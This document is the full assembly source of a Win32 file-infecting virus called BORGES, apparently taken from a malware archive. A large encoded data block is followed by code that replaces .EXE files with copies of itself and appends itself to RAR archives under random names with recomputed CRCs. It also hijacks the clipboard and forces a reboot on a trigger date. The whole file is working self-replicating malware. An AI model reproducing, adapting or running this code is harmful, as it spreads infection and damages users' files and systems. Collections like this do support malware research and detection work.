db 005h,0f4h,038h,04bh,037h,08dh,03ah,084h,0b9h,010h,093h,083h,081h,031h,080h
db 03dh,03ch,097h,0d3h,031h,089h,03fh,080h,0bdh,03ch,097h,087h,085h,035h,084h
db 011h,038h,093h,00eh,0d5h,083h,006h,03ch,069h,085h,0c7h,03ch,0d0h,037h,0c7h
db 065h,004h,06ch,04fh,029h,088h,087h,092h,083h,071h,03ch,080h,07fh,07bh,097h
db 087h,07ah,038h,082h,05ah,02ch,03bh,0cdh,09ch,0d7h,014h,000h,098h,04bh,02dh
db 08ch,086h,096h,087h,075h,038h,084h,07eh,07ah,093h,083h,07eh,03ch,086h,059h
db 028h,03fh,0c9h,098h,0d3h,02fh,088h,083h,092h,083h,071h,03ch,080h,07bh,07fh
db 097h,087h,07ah,038h,082h,050h,02ch,03bh,0cdh,09ch,00fh,0ceh,083h,05bh,029h
db 081h,071h,038h,0cfh,09ch,082h,05bh,029h,0b9h,0fah,075h,03ch,099h,07bh,038h
db 085h,0e0h,03ch,009h,038h,07eh,07ah,0dah,0c6h,016h,0bch,006h,02eh,034h,05eh
db 04dh,037h,086h,05fh,02dh,0bdh,0feh,003h,038h,0fbh,03ch,071h,044h,0ffh,086h
db 08ah,02ch,0bdh,034h,01ch,018h,0bfh,074h,03eh,018h,083h,0c2h,037h,086h,08ah
db 02ch,0bdh,0c7h,02eh,034h,04bh,00fh,085h,03bh,03ch,0cbh,09ah,04dh,0cch,0b9h
db 0c3h,0c5h,037h,04ch,00dh,0b9h,0c3h,038h,030h,04ch,013h,0b9h,0c3h,03bh,030h
db 04ch,011h,0b9h,0c3h,03eh,030h,04ch,017h,0b9h,0c3h,031h,030h,04ch,015h,0b9h
db 0c3h,034h,030h,04ch,01bh,0b9h,0c3h,037h,030h,04ch,019h,0b9h,0c3h,02ah,030h
db 04ch,01fh,0feh,03ah,02ah,030h,060h,0c5h,0fbh,08ch,07dh,0d7h,022h,08ch,07bh
db 0d7h,02eh,08ch,06bh,0d7h,02ah,08ch,077h,0d7h,036h,08ch,07ah,0d7h,032h,08ch
db 07dh,0d7h,03eh,08ch,079h,0d7h,03ah,08ch,06ah,09eh,02ah,030h,0b6h,0e7h,0c0h
db 0ffh,08ch,003h,081h,03fh,038h,086h,07ah,02eh,0f5h,01dh,0b3h,02ah,07bh,02eh
db 098h,07eh,02ah,0ffh,06bh,06dh,06eh,06bh,0d0h,009h,038h,086h,0c7h,0c3h,080h
db 0c3h,0c7h,017h,0e3h,0b6h,024h,07ah,00ah,0e4h,0e9h,0dfh,0e9h,0dfh,0b2h,0f8h
db 0b2h,0deh,0b2h,0eah,00ah,0cah,00bh,0bbh,003h,014h,00bh,0abh,005h,014h,071h
db 049h,0dah,0bfh,0cah,0c3h,00dh,0c3h,0c7h,063h,066h,065h,063h,0ffh,080h,0f1h
db 02bh,0b0h,0f3h,0f3h,068h,06dh,06ah,06bh,087h,007h,010h,00fh,0f1h,00fh,0eah
db 00fh,0f8h,0b6h,0f9h,06dh,081h,034h,038h,0c4h,0e9h,0e6h,0e9h,0e4h,04bh,03bh
db 0b9h,0ceh,080h,0d1h,00dh,01ch,0bbh,0deh,0c8h,0b5h,03dh,0b5h,06dh,03eh,0bbh
db 0fbh,03ch,065h,079h,0bdh,0c1h,03ch,039h,049h,0eeh,063h,062h,065h,060h,0ffh
db 026h,06ah,068h,06fh,0a4h,064h,0b8h,0d8h,0c6h,06ch,0a5h,017h,0f8h,0b2h,0e0h
db 087h,03ch,03ch,0fdh,00bh,0feh,038h,0f7h,067h,060h,062h,027h,0ffh,0a4h,012h
db 0c7h,022h,0a4h,03dh,04bh,03fh,0d1h,0abh,038h,01ah,0b9h,083h,073h,03ch,0dah
db 0cbh,04dh,03fh,0d1h,09fh,0cah,01ah,0b9h,043h,02bh,07ch,033h,048h,03bh,0d5h
db 0b8h,03ch,0a4h,06ch,06bh,06dh,06ah,06ah,06fh,012h,0feh,03ah,091h,03ch,07eh
db 03ah,026h,03ah,027h,032h,03fh,0b1h,04fh,03fh,087h,03fh,038h,085h,003h,03ch
db 0cbh,098h,027h,03bh,0d0h,04fh,038h,084h,039h,03fh,013h,0eeh,081h,03dh,068h
db 0a0h,016h,0c3h,026h,0a0h,039h,084h,039h,03fh,0a4h,012h,0c7h,022h,0a4h,03dh
db 03eh,032h,03fh,012h,0feh,03ah,02ah,030h,05ah,069h,026h,03ah,085h,033h,03ah
db 0d4h,043h,0c1h,03fh,023h,065h,084h,031h,03fh,081h,03eh,068h,087h,05bh,02bh
db 0a4h,012h,0c7h,022h,0a4h,03dh,080h,035h,03bh,0a0h,016h,0c3h,026h,0a0h,039h
db 084h,039h,03fh,081h,03dh,038h,00fh,0eah,087h,05bh,029h,0a4h,012h,0c7h,022h
db 0a4h,03dh,03fh,063h,066h,066h,061h,067h,060h,0a1h,0f2h,03eh,038h,03fh,06ah
db 053h,050h,05dh,051h,054h,09bh,01ch,068h,05dh,04ah,05dh,05fh,049h,059h,045h
db 019h,03fh,026h,03ah,06bh,032h,036h,023h,03fh,00fh,0f8h,0b2h,0e0h,082h,040h
db 03ch,087h,033h,010h,099h,09dh,0b2h,0f8h,083h,040h,03ch,080h,050h,028h,097h
db 0b4h,0f4h,093h,032h,036h,023h,03fh,083h,02bh,014h,081h,03dh,03ah,084h,068h
db 03ch,093h,0b7h,0f9h,097h,0c6h,0fdh,0b9h,0c5h,032h,03eh,04eh,0cdh,00bh,0fch
db 0f5h,02fh,080h,036h,03dh,087h,02bh,014h,081h,03dh,068h,00fh,0eah,0f1h,02bh
db 00fh,0f8h,0b2h,0f8h,082h,037h,014h,087h,044h,038h,099h,09dh,067h,03fh,023h
db 0fbh,06ch,06bh,06dh,06ah,06ah,06fh,069h,026h,03ah,036h,032h,027h,03bh,01eh
db 0bch,006h,089h,033h,072h,04dh,02ah,080h,03dh,03ah,087h,08eh,02eh,081h,03dh
db 038h,086h,0b8h,03ch,0f5h,02fh,0b9h,083h,073h,03ch,0dah,0cbh,04dh,036h,03fh
db 023h,065h,063h,066h,066h,061h,067h,060h,0f3h,01eh,0fah,03eh,095h,038h,074h
db 01eh,0fah,03eh,089h,033h,065h,087h,01ch,038h,0d4h,085h,0cch,0d3h,0deh,082h
db 0ceh,039h,085h,03eh,03ch,056h,07eh,0dah,0c0h,0d4h,094h,030h,048h,0c3h,0b7h
db 0cbh,085h,038h,03dh,082h,0cch,039h,0cfh,057h,0ffh,00fh,013h,03fh,008h,014h
db 038h,00dh,011h,03dh,0e3h,03ah,019h,03ah,02eh,023h,0c3h,054h,03eh,037h,034h
db 039h,03dh,038h,03ch,098h,00ch,079h,072h,06ch,075h,015h,06ah,071h,06eh,016h
db 078h,079h,068h,038h,07fh,070h,077h,074h,075h,06bh,068h,016h,071h,06bh,03ch
db 07bh,074h,073h,070h,071h,06fh,06ch,012h,07bh,06ch,06bh,03ch,079h,06ah,068h
db 012h,07bh,06eh,07bh,03ch,038h,03ch,0b8h,03ch,038h,03ch,064h,03ch,038h,03ch
db 054h,03ch,038h,03ch,07bh,006h,064h,07fh,077h,071h,075h,07dh,076h,078h,016h
db 07fh,077h,071h,038h,0b6h,03fh,03ch,0f9h,02ch,039h,03dh,038h,03dh,0a3h,09ch
db 091h,02eh,039h,03ch,039h,03ch,038h,004h,044h,0fah,0feh,050h,0c6h,0fah,0feh
db 0fah,07ch,03ch,038h,03ch,038h,0c4h,044h,05ah,05eh,052h,0c4h,05ah,05eh,042h
db 0c4h,03ch,038h,03ch,038h,004h,044h,0dah,05eh,05eh,058h,05eh,0deh,042h,004h
db 03ch,038h,03ch,038h,0cch,000h,020h,076h,0dah,05eh,05ah,05eh,040h,0c0h,03ch
db 038h,03ch,038h,044h,0c4h,05ah,052h,0c4h,050h,05eh,05eh,0c0h,040h,03ch,038h
db 03ch,038h,040h,0c6h,05eh,058h,054h,0c0h,054h,058h,05ch,0c8h,03ch,038h,03ch
db 038h,040h,0d6h,05ah,05ch,05ch,0dah,05ah,056h,0c2h,04eh,03eh,038h,03ch,038h
db 07eh,05eh,05ah,05eh,0dbh,046h,05ah,05eh,05ah,07ah,03ch,038h,03ch,038h,024h
db 004h,000h,020h,024h,020h,024h,004h,000h,020h,03ch,038h,03ch,038h,03ah,036h
db 032h,07eh,05ah,04eh,05ah,05eh,05ah,004h,03ch,038h,03ch,038h,01eh,05eh,0dah
db 05eh,048h,040h,050h,0deh,05ah,01ah,03ch,038h,03ch,038h,01ch,058h,0dch,058h
db 05ch,05ah,05ah,056h,05ah,0c4h,03ch,038h,03ch,038h,0beh,0fah,0fah,0d6h,0c2h
db 0eeh,0eah,0feh,0fah,07ch,03ch,038h,03ch,038h,0beh,0feh,0dah,0ceh,0e2h,0f6h
db 0fah,0feh,0fah,07ah,03ch,038h,03ch,038h,024h,004h,052h,05eh,05ah,05eh,05ah
db 04eh,000h,020h,03ch,038h,03ch,038h,0cch,044h,052h,05eh,05ah,056h,0c0h,058h
db 05ch,078h,03ch,038h,03ch,038h,00ch,044h,0fah,0feh,0fah,0feh,0fah,0eeh,040h
db 020h,030h,038h,03ch,038h,0c0h,05eh,05ah,05eh,048h,040h,050h,0deh,05ah,01ah
db 03ch,038h,03ch,038h,000h,05eh,05ah,05eh,00eh,020h,030h,01eh,05ah,084h,03ch
db 038h,03ch,038h,018h,046h,0e7h,0a1h,024h,020h,024h,020h,024h,004h,03ch,038h
db 03ch,038h,07eh,05eh,05ah,05eh,05ah,05eh,05ah,05eh,042h,004h,03ch,038h,03ch
db 038h,018h,05eh,05ah,05eh,05ah,05eh,05ah,05eh,000h,020h,03ch,038h,03ch,038h
db 0beh,0feh,0fah,0feh,0eah,0eeh,0c2h,0c6h,0d2h,07ch,03ch,038h,03ch,038h,07eh
db 05eh,000h,020h,024h,020h,024h,004h,05ah,07ah,03ch,038h,03ch,038h,07eh,05eh
db 05ah,004h,024h,020h,024h,020h,024h,004h,03ch,038h,03ch,038h,000h,05eh,07ah
db 034h,024h,044h,00ch,05ah,05ah,004h,03ch,038h,0b6h,03fh,03ch,039h,056h,0c9h
db 01ch,017h,07fh,018h,03ch,038h,048h,038h,0bch,010h,03ch,09eh,02eh,038h,03ch
db 09eh,02eh,038h,03ch,038h,03ch,038h,03ch,038h,0e2h,07dh,01eh,01dh,028h,008h
db 034h,038h,03ch,038h,03ch,038h,079h,077h,072h,071h,012h,07bh,073h,075h,05ch
db 0d2h,03ch,038h,022h,03fh,03dh,038h,02ch,038h,03ch,062h,0e2h,07dh,0bdh,01dh
db 09ah,02ah,03ch,038h,09ah,02ah,03ch,038h,03ch,038h,03ch,038h,03ch,038h,03ch
db 038h,03ch,038h,06dh,07eh,073h,073h,012h,07bh,073h,075h,03ch,038h,03ch,038h
db 03ch,038h,03ch,000h

.CODE

BORGES: push    offset SystemTimeStruc
        call    GetSystemTime

        mov     ax,word ptr offset [SystemTimeStruc+2]
        cmp     al,9
        jne     NoFQVbirthday

        mov     ax,word ptr offset [SystemTimeStruc+6]
        cmp     al,17
        je      Adios



NoFQVbirthday:
        push    offset Original
        push    000000C8h
        call    GetCurrentDirectoryA
        mov     dword ptr [Longitud],eax

        call    GetCommandLineA
        push    eax
        push    offset ParaCorrer
        call    lstrcpyA

        mov     edi,eax
Buscar: cmp     byte ptr [edi],'.'
        jz      ElPunto
        inc     edi
        jmp     Buscar
ElPunto:mov     esi,edi
        inc     esi
        mov     dword ptr [Posicion],esi
        add     edi,4
        mov     byte ptr [edi],00



Carrousell:
        jmp     InfectEXEs
Volver: push    offset PuntoPunto
        call    SetCurrentDirectoryA
        push    offset Actual
        push    000000C8h
        call    GetCurrentDirectoryA
        cmp     eax,dword ptr [Longitud]
        je      Salida
        mov     dword ptr [Longitud],eax
        jmp     Carrousell



InfectEXEs:
        push    offset Win32FindData
        push    offset Victimas
        call    FindFirstFileA
        mov     dword ptr [SearcHandle1],eax
Ciclo:  cmp     eax,-1
        je      Salida
        or      eax,eax
        jnz     Continuar
        jmp     InfectRARs



Continuar:
        push    offset Hallado
        push    offset Crear
        call    lstrcpyA

        mov     edi,offset Crear
SeguirBuscando:
        cmp     byte ptr [edi],'.'
        jz      PuntoEncontrado
        inc     edi
        jmp     SeguirBuscando
PuntoEncontrado:
        inc     edi
        mov     dword ptr [edi],0004d4f43h
        
        push    offset Crear
        push    offset Hallado
        call    MoveFileA

        push    0
        push    offset Hallado
        push    offset ParaCorrer+1
        call    CopyFileA                        

        push    offset Win32FindData
        push    dword ptr [SearcHandle1]
        call    FindNextFileA
        jmp     Ciclo



InfectRARs:
        push    offset Win32FindData
        push    offset Victimas2
        call    FindFirstFileA
        mov     dword ptr [SearcHandle2],eax
Ciclear:cmp     eax,-1
        je      Salida
        or      eax,eax
        jnz     Follow
        jmp     Volver



Follow: push    00
        push    00000080h
        push    03
        push    00
        push    00
        push    0c0000000h
        push    offset Hallado                  ; Abrir el RAR
        call    CreateFileA
        mov     dword ptr [FileHandle],eax

        push    02
        push    00
        push    00                              ; Puntero al final
        push    eax
        call    SetFilePointer

        mov     edi,offset RARName
        mov     ecx,7                           ; Get a random name
        call    Changer

        mov     esi,offset Kuarahy2
        mov     edi,Size                        ; Get CRC
        call    CRC32

        mov     dword ptr [RARCrc32],eax

        mov     esi,offset RARHeader+2
        mov     edi,HeaderSize-2                ; CRC of the header
        call    CRC32
        mov     word ptr [RARHeaderCRC],ax

        push    0
        push    offset Number
        push    HeaderSize
        push    offset RARHeader                ; Write header
        push    dword ptr [FileHandle]
        call    WriteFile

        mov     word ptr [RARHeaderCRC],0
        mov     word ptr [RARCrc32],0           ; Blank
        mov     word ptr [RARCrc32+2],0

        push    0
        push    offset Number
        push    Size
        push    offset Kuarahy2                 ; Drop viruz
        push    dword ptr [FileHandle]
        call    WriteFile

        push    dword ptr [FileHandle]
        call    CloseHandle

        push    offset Win32FindData
        push    dword ptr [SearcHandle2]
        call    FindNextFileA
        jmp     Ciclear



FillClipboard:
        push    0
        call    OpenClipboard
        call    EmptyClipboard
        push    (offset TextoVentana-offset TituloVentana)
        push    00000002                        ; GMEM_MOVEABLE
        call    GlobalAlloc
        push    eax
        mov     dword ptr [MemHandle],eax
        call    GlobalLock
        push    eax
        push    offset TituloVentana
        push    eax
        call    lstrcpyA
        push    dword ptr [MemHandle]
        call    GlobalUnlock
        push    dword ptr [MemHandle]
        push    00000001                        ; CF_TEXT
        call    SetClipboardData
        call    CloseClipboard
        jmp     Run4theNight



Adios:  push    00000001
        push    offset TituloVentana
        push    offset TextoVentana
        push    0
	call	MessageBoxA

        push    0
        push    00000002                        ; EWX_REBOOT
        call    ExitWindowsEx



Salida: push    offset Original
        call    SetCurrentDirectoryA

        mov     ax,word ptr offset [SystemTimeStruc+4]
        cmp     al,2
        je      FillClipboard



Run4theNight:
        push    offset ProcessInfo
        push    offset StartupInfo
        sub     eax,eax
        push    eax
        push    eax
        push    00000010h
        push    eax
        push    eax
        push    eax
        call    GetCommandLineA
        inc     eax
        push    eax

Done:   mov     esi,dword ptr [Posicion]
        mov     dword ptr [esi],0004d4f43h
        push    offset ParaCorrer+1
        call    CreateProcessA
Out:    push    0
        call    ExitProcess



CRC32:   cld                            ; Routine extracted from Vecna's
         push   ebx                     ; Inca virus. Muito brigado!
         mov    ecx,-1
         mov    edx,ecx
  NextByteCRC:
         xor    eax,eax
         xor    ebx,ebx
         lodsb
         xor    al,cl
         mov    cl,ch
         mov    ch,dl
         mov    dl,dh
         mov    dh,8
  NextBitCRC:
         shr    bx,1
         rcr    ax,1
         jnc    NoCRC
         xor    ax,08320h
         xor    bx,0edb8h
  NoCRC: dec    dh
         jnz    NextBitCRC
         xor    ecx,eax
         xor    edx,ebx
         dec    di
         jnz    NextByteCRC
         not    edx
         not    ecx
         pop    ebx
         mov    eax,edx
         rol    eax,16
         mov    ax,cx
         ret

Changer: mov    ebx,25
         call   GetTickCount            ; ¥embo random
         mov    edx,dword ptr offset [SystemTimeStruc+6]
         xor    eax,edx
         xor    edx,edx
         div    ebx
         xchg   eax,edx
         add    eax,65
         stosb
         loop   Changer
         ret

Ends
End BORGES





 ; Brought to you by 'The ZOO' !


